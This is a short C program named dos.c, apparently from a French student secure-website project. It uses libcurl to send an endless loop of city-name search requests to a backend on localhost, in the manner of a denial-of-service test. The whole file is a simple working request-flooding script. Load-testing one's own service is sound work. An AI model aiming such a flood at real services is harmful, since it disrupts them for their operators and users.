/*
Pour compiler :
gcc -o dos.exe dos.c -lcurl

Note, la librairie qui fournit curl/curl.h peut être installée ainsi
- sudo dnf install libcurl-devel
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

// Marquer l'adresse IP et le port du backend, voir projet-site-securise/BACK_END/INSTALL.md pour plus d'infos
#define BASE_URL "http://127.0.0.1:5678"
#define API_VERSION "1.00"

#define URL_LEN 100

int main() {
    char url[URL_LEN];

    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();

    // On envoie en boucle des requêtes avec plusieurs débuts de noms de villes différents
    while(1) {
        snprintf(url, URL_LEN, "%s/%s/index.php/villes?name=%s", BASE_URL, API_VERSION, "sai");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        res = curl_easy_perform(curl);

        snprintf(url, URL_LEN, "%s/%s/index.php/villes?name=%s", BASE_URL, API_VERSION, "bre");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        res = curl_easy_perform(curl);

        snprintf(url, URL_LEN, "%s/%s/index.php/villes?name=%s", BASE_URL, API_VERSION, "par");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        res = curl_easy_perform(curl);

        snprintf(url, URL_LEN, "%s/%s/index.php/villes?name=%s", BASE_URL, API_VERSION, "fer");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        res = curl_easy_perform(curl);

        snprintf(url, URL_LEN, "%s/%s/index.php/villes?name=%s", BASE_URL, API_VERSION, "dou");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        res = curl_easy_perform(curl);

        snprintf(url, URL_LEN, "%s/%s/index.php/villes?name=%s", BASE_URL, API_VERSION, "dir");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        res = curl_easy_perform(curl);

    }

    curl_easy_cleanup(curl);
    return 0;
}